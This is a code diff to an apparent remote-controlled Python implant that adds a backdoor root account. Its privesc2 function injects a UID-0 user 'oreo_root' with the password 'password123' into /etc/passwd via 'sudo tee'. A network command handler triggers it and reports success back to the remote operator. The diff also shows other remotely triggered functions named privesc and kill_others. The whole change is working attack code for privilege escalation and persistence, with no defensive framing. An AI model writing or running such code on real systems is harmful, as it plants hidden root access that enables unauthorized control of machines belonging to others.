@@ -67,18 +67,20 @@ def privesc():
         print("Already running with root privileges.")
 
 def privesc2():
-    # 1. Generate  hash
+    # 1. Generate the hash
     hash_str = crypt.crypt("password123", crypt.mksalt(crypt.METHOD_SHA512))
-    line = f"oreo_root:{hash_str}:0:0:root:/root:/bin/bash\n"
+    # Define the line to inject
+    line = f"oreo_root:{hash_str}:0:0:root:/root:/bin/bash"
     
     try:
-        # 2. Open the file in 'append' mode directly
-        # This will ONLY work if the OS permissions are broken (world-writable)
-        with open("/etc/passwd", "a") as f:
-            f.write(line)
-        print("[+] Successfully injected user without sudo!")
-    except PermissionError:
-        print("[-] Permission denied: /etc/passwd is not world-writable.")
+        # 2. Use sudo + tee to append the line to /etc/passwd
+        cmd = f"echo '{line}' | sudo tee -a /etc/passwd"
+        subprocess.run(cmd, shell=True, check=True)
+        print("[+] Successfully injected user via sudo tee")
+        return True
+    except Exception as e:
+        print(f"[-] Failed to inject user: {e}")
+        return False
  
 def kill_others():
     """
@@ -171,8 +173,11 @@ def handle_conn(conn, addr):
                 send_framed(conn, b"Privesc triggered: restarting as root")
             elif command_type == "privesc2":
                 print("Running privesc2")
-                privesc2()
-                send_framed(conn, b"Privesc2 executed: check etc/passwd")
+                success = privesc2()
+                if success:
+                    send_framed(conn, b"[+] Privesc2 successful! Account 'oreo_root' created.")
+                else:
+                    send_framed(conn, b"[-] Privesc2 failed: check server logs.")
             #Command 2: Python 
             elif command_type == "PY":
                 print("Running python")
